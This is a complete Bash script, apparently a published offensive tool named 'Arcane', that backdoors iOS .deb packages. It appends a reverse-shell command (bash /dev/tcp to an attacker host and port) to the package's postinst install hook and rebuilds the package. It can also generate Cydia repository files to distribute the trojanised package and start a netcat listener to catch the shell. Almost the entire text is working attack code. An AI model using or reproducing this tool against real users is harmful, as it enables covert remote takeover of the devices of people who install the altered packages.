#!/bin/bash

# version 0.1 by https://twitter.com/tokyoneon_
# writeup: https://null-byte.com/a-0324811/
# depends: apt-get install -Vy bzip2 netcat-traditional dpkg coreutils

clear;

# Various places throughout the resource files require an arbitrary
# string. Any alias will do fine here. If intended for Cydia, use 
# your Github Pages username.
hacker="Arcane";

# The color codes used to print messages in the terminal.
# Respectively: no color, red, yellow, green.
color=("\e[0;39m" "\e[1;31m" "\e[1;33m" "\e[1;32m");

# A messaging function that uses the previously defined color code
# array to print output in the terminal.
function msg () 
{ 
	case "$2" in 
		crit | critical)
			C="${color[1]}\n";
			S="exit 1"
		;;
		warn | warning)
			C="${color[2]}";
			S="sleep 1.5"
		;;
		succ | success)
			C="${color[3]}";
			S="sleep .5"
		;;
	esac;
	echo -e "$C[░]${color[0]} $1";
	eval "$S";
	unset C
};

# A simple error handling function that evaluates the exit code
# of commands and displays a desired "success" or "failure" message.
# For those comfortable with Bash, this is probably considered
# overkill. But I wanted the script to help beginners catch (and
# understand) where and why some commands might fail.
function status () 
{ 
	# https://www.cyberciti.biz/faq/bash-get-exit-code-of-command/
	if [[ "$?" -eq '0' ]]; then
		msg "$1" succ;
	else
		msg "$2" crit;
	fi
};

# Gotta have a --help menu.
function help_menu () 
{ 
	msg "./arcane.sh --input package.deb --lhost <attacker ip> --lport <1337>\n
  -i, --input\tiOS package to backdoor
  -f, --file\tfile containing commands to exec (default: not required)
  -h, --lhost\tlocal ip address for nc listener
  -p, --lport\tlocal port for netcat listener (default: 1337)
  -c, --cydia\tgenerate resources for apt/cydia repository (default: disabled)
  -n, --netcat\tautostart netcat listener (default: disabled)
  -u, --udp\tenable udp (default: tcp)
  -x, --noart\tif you hate awesome ascii art (default: enabled)
      --help\tyou're looking at it" crit;
};

# The default listening port used when starting a Netcat listener.
lport="1337";

# The default protocol used when starting a listener.
proto=("tcp");

# A function to parse command-line arguments. It will iterate through
# all of the user input and case values as defined.
function input_args () 
{ 
	while [[ "$#" != 0 ]]; do
		case "$1" in 
			-i | --input)
				if [[ ! -f "$2" ]]; then
					help_menu;
				else
					input="$2";
					lhost="0";
				fi
			;;
			-u | --udp)
				proto=("udp" " -u ")
			;;
			-p | --lport)
				lport="$2"
			;;
			-h | --lhost)
				lhost="$2"
			;;
			-n | --netcat)
				netcat="1"
			;;
			-c | --cydia)
				cydia="1"
			;;
			-f | --file)
				if [[ ! -f "$2" ]]; then
					msg "file not found, check file path and filename" warn;
					help_menu
				else
					infile="$2"
				fi
			;;
			-x | --noart)
				asciiArt="0"
			;;
			--help)
				help_menu
			;;
		esac;
		shift;
	done
};
input_args "$@";

# Check to ensure the --lhost and --input file have been defined.
[[ ! -n "$lhost" || ! -n "$input" ]] &&
	help_menu;

# Display Arcane ascii art. Use -x to silence the awesomeness.
function ascii_art () 
{ 
	arcane='
  ░█████╗░██████╗░░█████╗░░█████╗░███╗░░██╗███████╗
  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔════╝
  ███████║██████╔╝██║░░╚═╝███████║██╔██╗██║█████╗░░
  ██╔══██║██╔══██╗██║░░██╗██╔══██║██║╚████║██╔══╝░░
  ██║░░██║██║░░██║╚█████╔╝██║░░██║██║░╚███║███████╗
  ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝
                 v0.1 by @tokyoneon_';

	# A loop to print one character in the above ascii art at a time.
	# Admittedly, this is entirely theatrical, but it's pretty cool.
	for ((i=0; i<${#arcane}; i++ ))
	do
		# Adjust the sleep to change the speed.
		sleep .0018;
		printf "${color[1]}%s${color[0]}" "${arcane:$i:1}";
	done;
	printf "\n\n"
};

# Comment the following two lines to permanently suppress the art.
[[ "$asciiArt" != '0' ]] &&
	ascii_art;

# The working directory when decompressing and backdooring packages.
tmp="/tmp/.arcane";

# Create a temporary directory in /tmp.
[[ ! -d "$tmp" ]] &&
	mkdir -p "$tmp";
	
# Strip file path from input file. Used in following `tmp` variable.
i="$(basename $input)";

# The date is appended to the directory to prevent clobbering.
tmp="$tmp/${i%.*}-$(date +%H%M%S)";
msg "working directory: $tmp";

# The UDP feature is disable, bash/sh in iOS doesn't seem to function
# with the below $payload. UDP connections are established but don't 
# handle user input well. If you wish to solve this issue, comment 
# the following 3 lines to re-enable UDP functionality.
[[ "${proto[1]}" ]] &&
	msg "the --udp feature is temporarily disabled. see arcane.sh source" warn;
	proto=("tcp" " ");

# The default Bash command used to establish connections to the
# attacker's system if no input file is detected. Complex alternatives
# exist, however, this works well for simple PoC scripts.
payload="/bin/bash -c \"export PS1='\e[1;31marcane>\e[0;39m ';sh -i >& /dev/${proto[0]}/$lhost/$lport 0>&1 &\"";

# An `if` statement that prints the kind of backdoor.
if [[ "$infile" ]]; then
	msg "utilizing file: $infile\n";
else
	msg "utilizing generic ${proto[0]} backdoor\n";
fi;

# The "control" file template. Most iOS packages will include a 
# control file. In the event one is not found, Arcane will use the 
# below template. This file is responsible for how `dpkg` manages 
# files in the package. The `$hacker` variable is used here to occupy 
# various arbitrary fields. 
# https://www.debian.org/doc/manuals/maint-guide/dreq.en.html
controlTemp="Package: com.$hacker.backdoor
Name: $hacker backdoor
Version: 1337
Section: app
Architecture: iphoneos-arm
Description: A backdoored iOS package
Author: tokyoneon <https://tokyoneon.github.io/>
Maintainer: tokyoneon <https://tokyoneon.github.io/>";

# Decompress the input package. Use -R to preserve the control and
# postinst files.
dpkg-deb -R "$input" "$tmp";
status "unpacked $input" "error unpacking input file";

# The DEBIAN (case-sensitive) directory holds the control and postinst 
# files. If it doesn't exist, Arcane will attempt to create it.
if [[ ! -d "$tmp/DEBIAN" ]]; then
	mkdir -p "$tmp/DEBIAN";
	status "created directory: $tmp/DEBIAN" "error creating directory";
fi;

# An `if` statement to check for the control file.
if [[ ! -f "$tmp/DEBIAN/control" ]]; then
	# If no control is detected, create it using the template.
	echo "$controlTemp" > "$tmp/DEBIAN/control";
	status "created control file" "error with control template";
else
	# If a control file exists, Arcane will simply rename the package
	# as it appears in the list of available Cydia applications. This
	# makes the package easier to location in Cydia.
	msg "detected control file" succ;
	sed -i '0,/^Name:.*/s//Name: $hacker backdoor/' "$tmp/DEBIAN/control";
	status "modified control file" "error with control";
fi;

# The "post-installation" file. This file is generally responsible 
# for executing commands on the OS after installing the required 
# files. It's utilized by developers to manage and maintain various
# aspects of an installation. Arcane abuses this functionality by 
# appending malicious Bash commands to the file.
postinst="$tmp/DEBIAN/postinst";

# A function to handle the type of command execution embedded into the
# postinst file.
function inject_backdoor () 
{ 
	# If --file is used, `cat` the command(s) into the postinst file.
	if [[ "$infile" ]]; then
		cat "$infile" >> "$postinst";
		embed="[$infile]";
	else
		# If no --file, utilize the simple Bash payload, previously
		# defined.
		echo -e "$payload" >> "$postinst";
		embed="generic shell command";
	fi;
	status "embedded $embed into postinst" "error embedding backdoor";
	chmod 0755 "$postinst"
};

# If the postinst file doesn't exist, or if it's completely empty, 
# create it. The `-f` and `-s` conditional operators are used to
# evaluate the state of the file.
# https://www.sanspire.com/bash-if-statement-and-comparison-operators/
if [[ ! -f "$postinst" || ! -s "$postinst" ]]; then
	msg "postinst file not found" warn;
	printf '%s\n' '#!/bin/bash' > "$postinst";
	status "created postinst file" "error creating postinst";
fi;

inject_backdoor;

# The filename of the modified package, clearly labeled. 
backdoored="${input%.*}_BACKDOORED.deb";

# Print for dramatic effect.
msg "attempting to rebuild package" warn;
printf "${color[2]}[░]${color[0]} ";

# Re-compile the backdoored iOS package.
dpkg -b "$tmp" "$backdoored";
status "success!\n" "error rebuilding package";

# A function for Cydia-specific attacks. The function will create a
# working directory and generate several required files.
function cydia_build () 
{ 
	# Define working directory.
	cydia="/tmp/cydia";
	msg "working cydia directory: $cydia\n";
	
	# The "Packages" file template. APT repositories must contain a 
	# Packages file. It indexes all of the available packages in the
	# repository, including version information, checksums,
	# architecture type, priority level, etc. The below template uses
	# the `$hacker` variable to fill arbitrary values.
	# https://wiki.debian.org/DebianRepository/Format
	packagesTemp="Package: backdoor
Version: 1337
Architecture: iphoneos-arm
Maintainer: $hacker <$hacker@noreply.com>
Installed-Size: 1968
Pre-Depends: dpkg (>= 1.14.25-8)
Depends: firmware (>= 9.0) | rtadvd
Filename: $(basename $backdoored)
Size: $(ls -l $backdoored | cut -d' ' -f5)
MD5sum: $(md5sum $backdoored | cut -d' ' -f1)
SHA1: $(sha1sum $backdoored | cut -d' ' -f1)
SHA256: $(sha256sum $backdoored | cut -d' ' -f1)
Section: Networking
Priority: optional
Multi-Arch: foreign
Homepage: https://tokyoneon.github.io/
Description: ios backdoor
Depiction: https://tokyoneon.github.io/about
Name: backdoor
Tag: purpose::daemon, role::hacker";
	
	# The "Release" file template. It contains meta-information about
	# the distribution and checksums for the indices. It is generally
	# better not to modify this file as it may cause your package(s)
	# to not appear in the Cydia app.
	# https://wiki.debian.org/DebianRepository/Format#A.22Release.22_files
	releaseTemp="Origin: $hacker
Label: $hacker
Suite: stable
Version: 1.0
Codename: ios
Architectures: iphoneos-arm
Components: main
Description: backdoor";

	# Delete existing working directory related to Cydia config files.
	if [[ -d "$cydia" ]]; then
		rm -rf "$cydia";
		status "purged existing cydia directory" "error deleting cydia directory";
	fi;
	
	# Create new working directory.
	mkdir -p "$cydia";

	# Create generic index.html for Github Pages.
	echo "$hacker cydia repository" > "$cydia/index.html";

	# Create required Packages using the template.
	echo "$packagesTemp" > "$cydia/Packages";
	status "created Packages file" "error creating Packages file";
	
	# Compress the Packages file in bz2 format as required by some
	# APT repositories.
	bzip2 -c9 "$cydia/Packages" > "$cydia/Packages.bz2";
	status "compressed Packages with bzip2" "error compressing Packages file";
	
	# Create the Release file using the template.
	echo "$releaseTemp" > "$cydia/Release";
	status "created Release file" "error creating Release file";
	
	# Copy the backdoored package into the Cydia directory.
	cp "$backdoored" "$cydia/";
	status "copied backdoored package into cydia directory\n" "error copying backdoored package"
};


[[ "$cydia" = '1' ]] &&
	cydia_build;
	
# The Netcat command used by Arcane. Netcat's location on a given 
# OS will sometimes change, also the $proto and $lport are dynamic. 
netcatExec="$(command -v nc)${proto[1]}-v -l -p $lport";

msg "$netcatExec";

# An `if` statement to automate the execution of Netcat.
if [[ "$netcat" = '1' ]]; then
	msg "starting netcat listener on port $lport with ${proto[0]}";
	eval $netcatExec;	
fi
